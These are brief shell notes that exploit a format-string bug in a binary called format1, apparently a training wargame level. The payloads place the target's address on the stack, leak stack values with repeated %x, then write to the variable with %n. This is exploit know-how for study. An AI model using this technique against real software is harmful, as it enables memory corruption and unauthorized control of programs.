# find via 'objdump -t format1' all symbols in binary
# address of target variable is 0x08049638

./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08'+'BBBBB'+'%x '*200"`"
./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08'+'BBBBBB'+'%x '*127+'%x %x '"`"

./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08'+'BBBBBB'+'%x '*127+'%n %x '"`"